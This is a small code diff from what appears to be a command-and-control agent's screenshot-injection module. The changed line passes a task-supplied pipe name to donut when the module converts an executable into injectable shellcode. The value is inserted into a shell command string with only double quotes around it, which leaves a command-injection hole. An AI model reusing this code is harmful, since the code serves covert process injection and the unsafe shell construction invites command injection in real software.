@@ -51,7 +51,7 @@ class ScreenshotInjectCommand(CommandBase):
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
         stdout, stderr = await proc.communicate()
         
-        command = "{} -f 1 {}".format(donutPath, exePath)
+        command = "{} -f 1 -p \"{}\" {}".format(donutPath, task.args.get_arg("pipe_name"), exePath)
         # need to go through one more step to turn our exe into shellcode
         proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                         stderr=asyncio.subprocess.PIPE, cwd="/tmp/")
